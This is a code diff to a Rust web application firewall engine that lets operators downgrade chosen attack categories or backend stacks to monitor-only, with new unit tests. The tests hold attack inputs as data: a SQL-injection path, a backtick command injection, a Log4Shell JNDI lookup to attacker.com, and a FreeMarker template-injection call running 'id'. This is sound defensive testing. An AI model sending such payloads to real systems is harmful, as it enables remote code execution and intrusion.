@@ -23,7 +23,7 @@ use serde::{Deserialize, Serialize};
 use crate::normalize::ValueSource;
 use crate::normalize::{normalize_request, NormalizedRequest};
 use crate::rules::expression::{evaluate, EvalContext};
-use crate::rules::managed::default_managed_rules;
+use crate::rules::managed::{default_managed_rules, managed_rule_category};
 use crate::rules::signatures::{
     ci_backtick_interleaved, ci_chr_chain, crlf_header_injection_shaped,
     detect_deser_shape, detect_expr_injection, detect_js_call, detect_sqli,
@@ -35,7 +35,7 @@ use crate::rules::signatures::{
 };
 use crate::rules::{CompiledRule, RuleAction};
 use crate::score::{AnomalyScorer, ScoreBreakdown, ScoreClass};
-use crate::{StackSet, WafAction, WafLevel, WafVerdict};
+use crate::{CategorySet, StackSet, WafAction, WafLevel, WafVerdict};
 
 /// Operating mode for the engine.
 #[derive(
@@ -80,6 +80,14 @@ pub struct WafEngineConfig {
     /// When `true`, a Stage-1 critical hit short-circuits to an immediate
     /// Block verdict without running the rule engine.
     pub fast_path_block_on_critical: bool,
+    /// Attack categories downgraded to monitor-only. Hits in these
+    /// categories are still detected and scored into the aggregate (for
+    /// logging / Monitor verdicts) but can never block. Empty = enforce
+    /// everything.
+    pub monitor_categories: CategorySet,
+    /// Backend stacks downgraded to monitor-only, same semantics as
+    /// `monitor_categories`. `GENERIC`-only patterns are never downgraded.
+    pub monitor_stacks: StackSet,
 }
 
 impl Default for WafEngineConfig {
@@ -94,6 +102,8 @@ impl Default for WafEngineConfig {
             rules: Vec::new(),
             enable_managed_rules: true,
             fast_path_block_on_critical: true,
+            monitor_categories: CategorySet::EMPTY,
+            monitor_stacks: StackSet::EMPTY,
         }
     }
 }
@@ -145,6 +155,8 @@ enum HitRec<'a> {
         severity: u8,
         source: &'static str,
         name: &'a str,
+        /// Downgraded to monitor-only by the per-site monitor sets.
+        monitored: bool,
     },
     /// libinjection-style detector hit. The severity is applied to the
     /// scorer inline; the record only carries what string-building needs.
@@ -153,12 +165,14 @@ enum HitRec<'a> {
         fingerprint: String,
         source: &'static str,
         name: &'a str,
+        monitored: bool,
     },
     /// Structural expression-injection hit (Strict level only).
     Expr {
         container: &'static str,
         source: &'static str,
         name: &'a str,
+        monitored: bool,
     },
 }
 
@@ -169,6 +183,7 @@ struct RuleRec<'a> {
     name: &'a str,
     action: RuleAction,
     severity: u8,
+    monitored: bool,
 }
 
 /// Multi-stage WAF detection engine. Clone is intentionally not derived —
@@ -189,6 +204,8 @@ pub struct WafEngine {
     stacks: StackSet,
     max_decode_layers: usize,
     fast_path_block_on_critical: bool,
+    monitor_categories: CategorySet,
+    monitor_stacks: StackSet,
 }
 
 impl std::fmt::Debug for WafEngine {
@@ -230,6 +247,40 @@ impl WafEngine {
             stacks: config.stacks,
             max_decode_layers: config.max_decode_layers.clamp(1, 5),
             fast_path_block_on_critical: config.fast_path_block_on_critical,
+            monitor_categories: config.monitor_categories,
+            monitor_stacks: config.monitor_stacks,
+        }
+    }
+
+    /// `true` when a Stage-1 hit in `category` / `stack` is downgraded to
+    /// monitor-only by the per-site monitor sets. `GENERIC`-only stacks are
+    /// never stack-downgraded — a language-agnostic payload cannot be
+    /// attributed to a disabled backend.
+    fn hit_monitored(&self, category: AttackCategory, stack: StackSet) -> bool {
+        if self.monitor_categories.contains_category(category) {
+            return true;
+        }
+        let scoped = stack.except_generic();
+        !scoped.is_empty() && self.monitor_stacks.intersects(scoped)
+    }
+
+    /// `true` when a Stage-2 managed rule is downgraded to monitor-only.
+    /// Only managed rules participate: custom rules are explicit operator
+    /// configuration and are never silently downgraded. Score-gate rules
+    /// don't need this mapping (their expression input already excludes
+    /// downgraded hits); it matters for literal-expression rules like the
+    /// Log4Shell gate.
+    fn rule_monitored(&self, rule: &CompiledRule) -> bool {
+        if !rule.id.starts_with("PINGWAF-") {
+            return false;
+        }
+        match managed_rule_category(rule) {
+            Some(category) => {
+                self.monitor_categories.contains_category(category)
+                    || (rule.stacks.except_generic().bits() != 0
+                        && self.monitor_stacks.intersects(rule.stacks))
+            },
+            None => false,
         }
     }
 
@@ -364,6 +415,13 @@ impl WafEngine {
             for hit in &hits {
                 let mut severity = hit.severity;
                 let mut critical = severity >= 5;
+                // Per-site monitor downgrade: hits in monitored categories /
+                // stacks keep scoring into the aggregate but never into the
+                // blocking subset, and never trip the critical fast path.
+                let monitored = self.hit_monitored(
+                    hit.category,
+                    self.signatures.pattern(hit.pattern).stack,
+                );
                 let reflected_family = matches!(
                     hit.category,
                     AttackCategory::SqlInjection
@@ -450,7 +508,7 @@ impl WafEngine {
                     // the RCE sub-score below.
                     critical = true;
                 }
-                if critical && !search_phrase {
+                if critical && !search_phrase && !monitored {
                     critical_hit = true;
                 }
                 if !search_phrase {
@@ -467,25 +525,32 @@ impl WafEngine {
                         // aggregate score but stays out of the RCE
                         // sub-score, or PINGWAF-1061 blocks benign
                         // storage-style paths at Strict.
-                        self.scorer.add_severity_hit(&mut breakdown, severity);
+                        self.scorer.add_severity_hit_ex(
+                            &mut breakdown,
+                            severity,
+                            monitored,
+                        );
                         recs.push(HitRec::Sig {
                             pattern: hit.pattern,
                             severity,
                             source: value.source.as_str(),
                             name: &value.name,
+                            monitored,
                         });
                         continue;
                     }
-                    self.scorer.add_category_hit(
+                    self.scorer.add_category_hit_ex(
                         &mut breakdown,
                         hit.category,
                         severity,
+                        monitored,
                     );
                     recs.push(HitRec::Sig {
                         pattern: hit.pattern,
                         severity,
                         source: value.source.as_str(),
                         name: &value.name,
+                        monitored,
                     });
                 }
             }
@@ -496,17 +561,25 @@ impl WafEngine {
             if value.source == ValueSource::Path
                 && path_tautology_segment(needle)
             {
-                critical_hit = true;
-                self.scorer.add_category_hit(
+                let monitored = self.hit_monitored(
+                    AttackCategory::SqlInjection,
+                    StackSet::GENERIC,
+                );
+                if !monitored {
+                    critical_hit = true;
+                }
+                self.scorer.add_category_hit_ex(
                     &mut breakdown,
                     AttackCategory::SqlInjection,
                     5,
+                    monitored,
                 );
                 recs.push(HitRec::Lib {
                     kind: "libinjection-sqli",
                     fingerprint: "path-segment-tautology".to_string(),
                     source: value.source.as_str(),
                     name: &value.name,
+                    monitored,
                 });
             }
             // Raw backticks inside the path (`/ax--exec=`id`--remote`): URL
@@ -515,17 +588,25 @@ impl WafEngine {
             if value.source == ValueSource::Path
                 && needle.matches('`').count() >= 2
             {
-                critical_hit = true;
-                self.scorer.add_category_hit(
+                let monitored = self.hit_monitored(
+                    AttackCategory::CommandInjection,
+                    StackSet::GENERIC,
+                );
+                if !monitored {
+                    critical_hit = true;
+                }
+                self.scorer.add_category_hit_ex(
                     &mut breakdown,
                     AttackCategory::CommandInjection,
                     5,
+                    monitored,
                 );
                 recs.push(HitRec::Lib {
                     kind: "ci-shape",
                     fingerprint: "path-backticks".to_string(),
                     source: value.source.as_str(),
                     name: &value.name,
+                    monitored,
                 });
             }
             // Double executable extension at the path tail
@@ -534,17 +615,25 @@ impl WafEngine {
             if value.source == ValueSource::Path
                 && pt_double_exec_extension(&value.decoded)
             {
-                critical_hit = true;
-                self.scorer.add_category_hit(
+                let monitored = self.hit_monitored(
+                    AttackCategory::PathTraversal,
+                    StackSet::GENERIC,
+                );
+                if !monitored {
+                    critical_hit = true;
+                }
+                self.scorer.add_category_hit_ex(
                     &mut breakdown,
                     AttackCategory::PathTraversal,
                     5,
+                    monitored,
                 );
                 recs.push(HitRec::Lib {
                     kind: "pt-shape",
                     fingerprint: "double-exec-extension".to_string(),
                     source: value.source.as_str(),
                     name: &value.name,
+                    monitored,
                 });
             }
             if !matches!(
@@ -582,20 +671,26 @@ impl WafEngine {
                         && needle.len() > 256);
                 let (severity, critical) =
                     if weak { (2, false) } else { (5, true) };
-                if critical && !search_phrase {
+                let monitored = self.hit_monitored(
+                    AttackCategory::SqlInjection,
+                    StackSet::GENERIC,
+                );
+                if critical && !search_phrase && !monitored {
                     critical_hit = true;
                 }
                 if !search_phrase {
-                    self.scorer.add_category_hit(
+                    self.scorer.add_category_hit_ex(
                         &mut breakdown,
                         AttackCategory::SqlInjection,
                         severity,
+                        monitored,
                     );
                     recs.push(HitRec::Lib {
                         kind: "libinjection-sqli",
                         fingerprint: sqli_fp,
                         source: value.source.as_str(),
                         name: &value.name,
+                        monitored,
                     });
                 }
             }
@@ -621,20 +716,24 @@ impl WafEngine {
                                 && !self.level.is_strict())));
                 let (severity, critical) =
                     if weak { (2, false) } else { (5, true) };
-                if critical && !collected_js_uri {
+                let monitored =
+                    self.hit_monitored(AttackCategory::Xss, StackSet::GENERIC);
+                if critical && !collected_js_uri && !monitored {
                     critical_hit = true;
                 }
                 if !collected_js_uri {
-                    self.scorer.add_category_hit(
+                    self.scorer.add_category_hit_ex(
                         &mut breakdown,
                         AttackCategory::Xss,
                         severity,
+                        monitored,
                     );
                     recs.push(HitRec::Lib {
                         kind: "libinjection-xss",
                         fingerprint: xss_fp,
                         source: value.source.as_str(),
                         name: &value.name,
+                        monitored,
                     });
                 }
             }
@@ -658,19 +757,25 @@ impl WafEngine {
                 } else {
                     (4, false)
                 };
-                if critical {
+                let monitored = self.hit_monitored(
+                    AttackCategory::Deserialization,
+                    StackSet::GENERIC,
+                );
+                if critical && !monitored {
                     critical_hit = true;
                 }
-                self.scorer.add_category_hit(
+                self.scorer.add_category_hit_ex(
                     &mut breakdown,
                     AttackCategory::Deserialization,
                     severity,
+                    monitored,
                 );
                 recs.push(HitRec::Lib {
                     kind: "deser-shape",
                     fingerprint: shape.to_string(),
                     source: value.source.as_str(),
                     name: &value.name,
+                    monitored,
                 });
             }
 
@@ -680,59 +785,89 @@ impl WafEngine {
             // framed newline (`ldap://…%0astats`), and a scheme prefix glued
             // to backslash traversal (`dir=http\..\admin\…`).
             if ci_backtick_interleaved(needle) {
-                critical_hit = true;
-                self.scorer.add_category_hit(
+                let monitored = self.hit_monitored(
+                    AttackCategory::CommandInjection,
+                    StackSet::GENERIC,
+                );
+                if !monitored {
+                    critical_hit = true;
+                }
+                self.scorer.add_category_hit_ex(
                     &mut breakdown,
                     AttackCategory::CommandInjection,
                     5,
+                    monitored,
                 );
                 recs.push(HitRec::Lib {
                     kind: "ci-shape",
                     fingerprint: "backtick-interleaved".to_string(),
                     source: value.source.as_str(),
                     name: &value.name,
+                    monitored,
                 });
             }
             if ci_chr_chain(needle) {
-                critical_hit = true;
-                self.scorer.add_category_hit(
+                let monitored = self.hit_monitored(
+                    AttackCategory::CommandInjection,
+                    StackSet::GENERIC,
+                );
+                if !monitored {
+                    critical_hit = true;
+                }
+                self.scorer.add_category_hit_ex(
                     &mut breakdown,
                     AttackCategory::CommandInjection,
                     5,
+                    monitored,
                 );
                 recs.push(HitRec::Lib {
                     kind: "ci-shape",
                     fingerprint: "chr-codepoint-chain".to_string(),
                     source: value.source.as_str(),
                     name: &value.name,
+                    monitored,
                 });
             }
             if ssrf_protocol_smuggling(needle) {
-                critical_hit = true;
-                self.scorer.add_category_hit(
+                let monitored =
+                    self.hit_monitored(AttackCategory::Ssrf, StackSet::GENERIC);
+                if !monitored {
+                    critical_hit = true;
+                }
+                self.scorer.add_category_hit_ex(
                     &mut breakdown,
                     AttackCategory::Ssrf,
                     5,
+                    monitored,
                 );
                 recs.push(HitRec::Lib {
                     kind: "ssrf-shape",
                     fingerprint: "protocol-smuggling".to_string(),
                     source: value.source.as_str(),
                     name: &value.name,
+                    monitored,
                 });
             }
             if pt_remote_backslash_include(needle) {
-                critical_hit = true;
-                self.scorer.add_category_hit(
+                let monitored = self.hit_monitored(
+                    AttackCategory::PathTraversal,
+                    StackSet::GENERIC,
+                );
+                if !monitored {
+                    critical_hit = true;
+                }
+                self.scorer.add_category_hit_ex(
                     &mut breakdown,
                     AttackCategory::PathTraversal,
                     5,
+                    monitored,
                 );
                 recs.push(HitRec::Lib {
                     kind: "pt-shape",
                     fingerprint: "remote-backslash-include".to_string(),
                     source: value.source.as_str(),
                     name: &value.name,
+                    monitored,
                 });
             }
 
@@ -740,13 +875,20 @@ impl WafEngine {
             // value. A container with interpreter-facing shape is treated as
             // a critical hit; Normal only scores template openers.
             if self.level.is_strict() {
+                let expr_monitored = self.hit_monitored(
+                    AttackCategory::TemplateInjection,
+                    StackSet::GENERIC,
+                );
                 if let Some(container) = detect_expr_injection(needle) {
-                    self.scorer.add_expr_hit(&mut breakdown);
-                    critical_hit = true;
+                    self.scorer.add_expr_hit_ex(&mut breakdown, expr_monitored);
+                    if !expr_monitored {
+                        critical_hit = true;
+                    }
                     recs.push(HitRec::Expr {
                         container,
                         source: value.source.as_str(),
                         name: &value.name,
+                        monitored: expr_monitored,
                     });
                 } else if detect_js_call(needle)
                     && (value.field || value.source != ValueSource::Body)
@@ -758,12 +900,15 @@ impl WafEngine {
                     // dumps) is prose — skipped entirely, like the
                     // search-phrase rule, or the RCE sub-score alone would
                     // re-block what the critical gate let through.
-                    self.scorer.add_expr_hit(&mut breakdown);
-                    critical_hit = true;
+                    self.scorer.add_expr_hit_ex(&mut breakdown, expr_monitored);
+                    if !expr_monitored {
+                        critical_hit = true;
+                    }
                     recs.push(HitRec::Expr {
                         container: "js-call",
                         source: value.source.as_str(),
                         name: &value.name,
+                        monitored: expr_monitored,
                     });
                 }
             }
@@ -790,7 +935,11 @@ impl WafEngine {
             let critical = (hit.severity >= 5)
                 || (self.level.is_strict()
                     && hit.category == AttackCategory::CrlfInjection);
-            if critical {
+            let monitored = self.hit_monitored(
+                hit.category,
+                self.signatures.pattern(hit.pattern).stack,
+            );
+            if critical && !monitored {
                 critical_hit = true;
             }
             // Mirror of the decoded-value gate: CI/Deser shapes found on the
@@ -801,12 +950,17 @@ impl WafEngine {
                 AttackCategory::CommandInjection
                     | AttackCategory::Deserialization
             ) {
-                self.scorer.add_severity_hit(&mut breakdown, hit.severity);
+                self.scorer.add_severity_hit_ex(
+                    &mut breakdown,
+                    hit.severity,
+                    monitored,
+                );
             } else {
-                self.scorer.add_category_hit(
+                self.scorer.add_category_hit_ex(
                     &mut breakdown,
                     hit.category,
                     hit.severity,
+                    monitored,
                 );
             }
             recs.push(HitRec::Sig {
@@ -814,6 +968,7 @@ impl WafEngine {
                 severity: hit.severity,
                 source: "path",
                 name: "",
+                monitored,
             });
         }
 
@@ -837,6 +992,18 @@ impl WafEngine {
             waf_score_sqli: breakdown.sqli_score,
             waf_score_xss: breakdown.xss_score,
             waf_score_rce: breakdown.rce_score,
+        };
+        // Managed rules evaluate against the blocking-only snapshot: hits
+        // downgraded to monitor-only can never push a family or aggregate
+        // gate. The full snapshot stays available to custom rules (explicit
+        // operator configuration) and the Allow pre-pass (allowlists must
+        // not be blinded by monitor config).
+        let block_ctx = EvalContext {
+            waf_score: breakdown.block_total,
+            waf_score_sqli: breakdown.block_sqli_score,
+            waf_score_xss: breakdown.block_xss_score,
+            waf_score_rce: breakdown.block_rce_score,
+            ..ctx
         };
 
         // ----- Allow pre-pass -----
@@ -892,14 +1059,20 @@ impl WafEngine {
             {
                 continue;
             }
-            if !evaluate(&rule.expression, &ctx) {
+            let is_managed = rule.id.starts_with("PINGWAF-");
+            // Managed rules see the blocking-only score snapshot; custom
+            // rules see the full aggregate.
+            let rule_ctx = if is_managed { &block_ctx } else { &ctx };
+            if !evaluate(&rule.expression, rule_ctx) {
                 continue;
             }
+            let rule_monitored = self.rule_monitored(rule);
             rule_recs.push(RuleRec {
                 id: &rule.id,
                 name: &rule.name,
                 action: rule.action,
                 severity: rule.severity,
+                monitored: rule_monitored,
             });
             match rule.action {
                 RuleAction::Allow => {
@@ -909,12 +1082,24 @@ impl WafEngine {
                     self.scorer.add_severity_hit(&mut breakdown, rule.severity);
                 },
                 RuleAction::Block => {
-                    self.scorer.add_severity_hit(&mut breakdown, rule.severity);
-                    forced_action = Some(WafAction::Block);
+                    self.scorer.add_severity_hit_ex(
+                        &mut breakdown,
+                        rule.severity,
+                        rule_monitored,
+                    );
+                    if !rule_monitored {
+                        forced_action = Some(WafAction::Block);
+                    }
                 },
                 RuleAction::Challenge | RuleAction::JsChallenge => {
-                    self.scorer.add_severity_hit(&mut breakdown, rule.severity);
-                    if forced_action != Some(WafAction::Block) {
+                    self.scorer.add_severity_hit_ex(
+                        &mut breakdown,
+                        rule.severity,
+                        rule_monitored,
+                    );
+                    if !rule_monitored
+                        && forced_action != Some(WafAction::Block)
+                    {
                         forced_action = Some(WafAction::Challenge);
                     }
                 },
@@ -922,14 +1107,16 @@ impl WafEngine {
         }
 
         // ----- Final scoring -----
-        breakdown.overall_class = self.scorer.classify(breakdown.total);
+        breakdown.overall_class = self.scorer.classify(breakdown.block_total);
         let action = if let Some(a) = forced_action {
             a
-        } else if self.scorer.should_block(breakdown.total) {
+        } else if self.scorer.should_block(breakdown.block_total) {
             WafAction::Block
         } else if breakdown.total > 0 {
             // Below threshold but something fired — surface it as Monitor so
-            // the caller still logs the event.
+            // the caller still logs the event. Monitor-only hits keep their
+            // aggregate score, so a downgrade surfaces here exactly as an
+            // ordinary sub-threshold detection does.
             WafAction::Monitor
         } else {
             WafAction::Pass
@@ -987,17 +1174,34 @@ impl WafEngine {
     ) -> Vec<String> {
         let mut details = Vec::with_capacity(recs.len() + rules.len());
         for rec in recs {
+            let monitored_suffix = match rec {
+                HitRec::Sig { monitored, .. }
+                | HitRec::Lib { monitored, .. }
+                | HitRec::Expr { monitored, .. } => {
+                    if *monitored {
+                        " [monitored]"
+                    } else {
+                        ""
+                    }
+                },
+            };
             match rec {
                 HitRec::Sig {
                     pattern,
                     severity,
                     source,
                     name,
+                    ..
                 } => {
                     let p = self.signatures.pattern(*pattern);
                     details.push(format!(
-                        "{} [{} sev={}] in {} '{}'",
-                        p.id, p.category, severity, source, name
+                        "{} [{} sev={}] in {} '{}'{}",
+                        p.id,
+                        p.category,
+                        severity,
+                        source,
+                        name,
+                        monitored_suffix
                     ));
                 },
                 HitRec::Lib {
@@ -1008,29 +1212,32 @@ impl WafEngine {
                     ..
                 } => {
                     details.push(format!(
-                        "{} [{}] in {} '{}'",
-                        kind, fingerprint, source, name
+                        "{} [{}] in {} '{}'{}",
+                        kind, fingerprint, source, name, monitored_suffix
                     ));
                 },
                 HitRec::Expr {
                     container,
                     source,
                     name,
+                    ..
                 } => {
                     details.push(format!(
-                        "expr-injection [{}] in {} '{}'",
-                        container, source, name
+                        "expr-injection [{}] in {} '{}'{}",
+                        container, source, name, monitored_suffix
                     ));
                 },
             }
         }
         for rule in rules {
+            let suffix = if rule.monitored { " [monitored]" } else { "" };
             details.push(format!(
-                "{} [{}] action={} sev={}",
+                "{} [{}] action={} sev={}{}",
                 rule.id,
                 rule.name,
                 rule.action.as_str(),
-                rule.severity
+                rule.severity,
+                suffix
             ));
         }
         details
@@ -1044,7 +1251,7 @@ impl WafEngine {
         action: Option<WafAction>,
         reason: &str,
     ) -> WafVerdict {
-        breakdown.overall_class = self.scorer.classify(breakdown.total);
+        breakdown.overall_class = self.scorer.classify(breakdown.block_total);
         let mut action = action.unwrap_or(WafAction::Pass);
         if self.mode == WafMode::Monitor
             && matches!(action, WafAction::Block | WafAction::Challenge)
@@ -1360,6 +1567,94 @@ mod tests {
             level: WafLevel::Strict,
             ..Default::default()
         })
+    }
+
+    #[test]
+    fn category_and_stack_monitor_set_helpers() {
+        // CategorySet: unknown names ignored, empty default = enforce all.
+        let set = CategorySet::from_names(["sqli", "nonsense", "xss"]);
+        assert!(set.contains_category(AttackCategory::SqlInjection));
+        assert!(set.contains_category(AttackCategory::Xss));
+        assert!(!set.contains_category(AttackCategory::CommandInjection));
+        assert!(CategorySet::default().is_empty());
+
+        // StackSet::from_names_exact does NOT force GENERIC (unlike
+        // from_names), so an empty monitor set means "nothing downgraded".
+        let java = StackSet::from_names_exact(["java"]);
+        assert!(java.contains(StackSet::JAVA));
+        assert!(!java.contains(StackSet::GENERIC));
+        assert!(StackSet::from_names(["java"]).contains(StackSet::GENERIC));
+        assert!(StackSet::GENERIC.except_generic().is_empty());
+        assert!(java.except_generic().intersects(StackSet::JAVA));
+        assert!(StackSet::EMPTY.is_empty());
+    }
+
+    #[test]
+    fn monitored_category_downgrades_block_to_monitor() {
+        // Path-segment tautology is a critical SQLi shape that blocks by
+        // default via the Stage-1 fast path.
+        let r = req("GET", "/a/1' or ''='/b", "");
+        assert_eq!(engine().inspect(&r).action, WafAction::Block);
+
+        // With sqli monitored the same request is still detected —
+        // aggregate score, [monitored] details — but only Monitor.
+        let mut cfg = WafEngineConfig::default();
+        cfg.monitor_categories = CategorySet::from_names(["sqli"]);
+        let v = WafEngine::new(&cfg).inspect(&r);
+        assert_eq!(v.action, WafAction::Monitor);
+        assert_eq!(v.breakdown.block_total, 0);
+        assert!(v.breakdown.total > 0);
+        assert!(v.details.contains("[monitored]"));
+    }
+
+    #[test]
+    fn monitored_category_keeps_other_families_blocking() {
+        // RCE shapes stay blocking while sqli is downgraded.
+        let mut cfg = WafEngineConfig::default();
+        cfg.monitor_categories = CategorySet::from_names(["sqli"]);
+        let m = WafEngine::new(&cfg);
+        let v = m.inspect(&req("GET", "/ax--exec=`id`--remote", ""));
+        assert_eq!(v.action, WafAction::Block);
+    }
+
+    #[test]
+    fn monitored_stack_downgrades_scoped_hits_only() {
+        let mut cfg = WafEngineConfig::default();
+        cfg.monitor_stacks = StackSet::from_names_exact(["java"]);
+        let m = WafEngine::new(&cfg);
+        // The Java-scoped Log4Shell needle is downgraded…
+        let mut r = req("GET", "/", "");
+        r.headers.push((
+            "User-Agent".into(),
+            "${jndi:ldap://attacker.com/x}".into(),
+        ));
+        let v = m.inspect(&r);
+        assert!(matches!(v.action, WafAction::Monitor | WafAction::Pass));
+        // …while the language-agnostic SQLi shape still blocks.
+        let r = req("GET", "/a/1' or ''='/b", "");
+        assert_eq!(m.inspect(&r).action, WafAction::Block);
+    }
+
+    #[test]
+    fn monitored_ssti_downgrades_expr_hits_at_strict() {
+        let mut cfg = WafEngineConfig::default();
+        cfg.level = WafLevel::Strict;
+        cfg.monitor_categories = CategorySet::from_names(["ssti"]);
+        let m = WafEngine::new(&cfg);
+        let v = m.inspect(&req(
+            "GET",
+            "/page",
+            "tpl=${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        ));
+        assert!(
+            matches!(v.action, WafAction::Monitor | WafAction::Pass),
+            "got {:?} details: {}",
+            v.action,
+            v.details
+        );
+        // The expr contribution reached the aggregate but not the blocking
+        // subset, so the strict RCE gate (PINGWAF-1061) cannot fire on it.
+        assert_eq!(v.breakdown.block_rce_score, 0);
     }
 
     #[test]
